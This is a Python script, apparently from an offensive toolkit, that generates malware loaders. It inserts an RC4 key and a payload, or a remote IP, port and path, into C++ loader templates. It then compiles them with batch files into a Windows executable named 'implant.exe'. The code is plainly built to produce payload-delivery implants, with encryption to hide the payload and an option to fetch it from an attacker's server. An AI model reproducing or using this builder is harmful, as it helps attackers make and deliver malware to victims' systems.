import os


def switch_template(template):
    switcher = {
        "basic": "./src/basic.cpp",
        "dynamic": "./src/dynamic.cpp",
        "remote": "./src/remote.cpp",
        5: "Case 5"
    }
    return switcher.get(template, "Invalid template name")

def new_loader(template_path, payload,RC4_key):
    try:
        with open(template_path, 'r',encoding='utf-8') as f:
            file_content = f.read()

        file_content = file_content.replace('{{RC4_key}}', RC4_key)
        new_content = file_content.replace('{{payload}}', payload)

        with open("./compile/new_loader.cpp", 'w') as f:
            f.write(new_content)

        print("[+] new_loader.cpp 文件生成成功")
    except FileNotFoundError as e:
        print(f"错误: {e}")

def new_loader_remote(template_path, IP,PORT,PATH):
    try:
        with open(template_path, 'r',encoding='utf-8') as f:
            file_content = f.read()

        file_content = file_content.replace('{{IP}}', IP)
        file_content = file_content.replace('{{PORT}}', PORT)
        new_content = file_content.replace('{{PATH}}', PATH)
        with open("./compile/new_loader.cpp", 'w') as f:
            f.write(new_content)

        print("[+] new_loader.cpp 文件生成成功")
    except FileNotFoundError as e:
        print(f"错误: {e}")


def compilefile(arch,type):
    try:
        if arch == 64 and type == "local":
            bat_file = "compile_x64.bat"
        elif arch == 32 and type == "local":
            bat_file = "compile_x32.bat"
        elif arch ==64 and type == "remote":
            bat_file = "compile_x64_remote.bat"
        elif arch ==32 and type == "remote":
            bat_file = "compile_x32_remote.bat"
        directory_path = ".\\compile\\"
        os.chdir(directory_path)

        if not os.path.exists("new_loader.cpp"):
            raise FileNotFoundError(f"new_loader.cpp文件不存在")

        result = os.system(bat_file)
        if result != 0:
            raise RuntimeError(f"{bat_file} 执行失败")

        if not os.path.exists("implant.exe"):
            raise FileNotFoundError(f"exe生成失败请根据报错检查原因")
        else:
            print("EXE生成成功")
            implant_path = os.getcwd() + "\\implant.exe"
            return implant_path

    except FileNotFoundError as e:
        print(f"错误: {e}")
    except RuntimeError as e:
        print(f"错误: {e}")

